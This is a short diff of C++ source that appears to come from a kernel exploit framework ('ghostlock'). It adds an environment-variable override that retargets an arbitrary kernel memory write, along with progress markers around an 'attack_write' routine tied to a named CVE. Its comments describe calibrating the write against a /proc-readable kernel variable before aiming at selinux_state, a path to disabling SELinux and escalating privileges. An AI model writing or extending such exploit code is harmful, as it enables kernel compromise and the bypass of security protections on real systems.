@@ -103,7 +103,17 @@ namespace ghostlock::session::backend {
                 return false;
             }
 
-            const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);
+            /* Calibration hook: aim the write at an address whose contents are
+         * readable from userspace (sysctl_bootid via
+         * /proc/sys/kernel/random/boot_id) to prove the image->direct-map
+         * translation without touching selinux_state. */
+            uintptr_t effective_target = target;
+            if (const char *probe = getenv("GL_WRITE_TARGET")) {
+                const auto parsed = strtoull(probe, nullptr, 16);
+                if (parsed)
+                    effective_target = static_cast<uintptr_t>(parsed);
+            }
+            const auto request = memory::WriteRequest::make(effective_target, static_cast<memory::WriteMode>(mode), leaf != 0);
 
             for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
                 pr_info("%s attempt %u/%u\n", stage, attempt, attempts);
@@ -128,7 +138,9 @@ namespace ghostlock::session::backend {
                      * waiters to drain before the second scan. */
                     support::settle_w2_prebuild();
                 }
+                support::progress_marker("w_begin");
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
+                support::progress_marker(routed ? "w_back_ok" : "w_back_fail");
                 if (!routed) {
                     support::discard_prebuilt_page();
                     pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
